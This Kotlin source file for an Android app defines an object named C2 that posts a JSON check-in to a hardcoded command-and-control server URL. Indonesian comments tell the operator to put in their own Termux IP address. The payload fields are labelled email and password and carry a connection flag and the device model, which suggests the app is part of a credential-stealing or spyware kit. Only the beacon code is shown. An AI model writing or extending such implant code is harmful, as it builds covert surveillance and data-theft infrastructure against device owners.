package com.ops.agent

import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL

object C2 {
    // GANTI IP INI JADI IP TERMUX LO
    private const val C2_URL = "http://192.168.1.10:8080/simpan.php" 

    fun connect() {
        try {
            val url = URL(C2_URL)
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.setRequestProperty("Content-Type", "application/json")

            val payload = JSONObject()
                .put("email", "Agent_Connected")
                .put("password", android.os.Build.MODEL)

            val writer = OutputStreamWriter(conn.outputStream)
            writer.write(payload.toString())
            writer.flush()

            val responseCode = conn.responseCode
            if (responseCode == 200) {
                // Sukses konek
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
